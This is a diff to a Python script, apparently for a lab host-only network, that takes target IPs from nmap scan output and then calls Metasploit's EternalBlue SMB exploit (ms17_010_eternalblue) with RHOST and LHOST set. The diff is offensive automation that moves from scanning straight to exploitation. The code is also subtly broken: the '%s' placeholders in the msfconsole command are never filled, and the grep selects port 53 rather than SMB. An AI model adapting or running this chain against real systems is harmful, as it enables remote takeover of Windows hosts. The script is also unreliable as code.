@@ -28,13 +28,17 @@ def nmapScan(ip):
     confirmT = input("\nYour target might be this [y/n]:\n")
     while(True):
        if (confirmT == "yes" or confirmT == "y" or confirmT == "Y"):
-           return 0
+       	   ip_new = os.popen("cat %s/nmap_scan | grep 'Ports: 53'| cut -d ' ' -f 2 | sort -u"%DIR ).read()
+           return ip_new
        elif (confirmT == "no" or confirmT == "n" or confirmT == "N"):
            ip_new = input("Enter manually your target's IP:\n")
            if (loop(ip_new)):
                return ip_new
        else:
            continue
+
+def msfconsole(target, host):
+	subprocess.call(["msfconsole", "-q", "-x", "use exploit/windows/smb/ms17_010_eternalblue; set RHOST %s; set LHOST %s;"])
 
 if __name__ == '__main__':
 
@@ -58,4 +62,6 @@ if __name__ == '__main__':
         subprocess.call(["ip","a"])
         ipt = input("\n\n\nEnter the name of the current Hots-Only network IP. Example: 0.0.0.0\n")
         if(loop(ipt)):
-            nmapScan(network)
+            startup = nmapScan(network)
+            msfconsole(startup, ipt)
+            
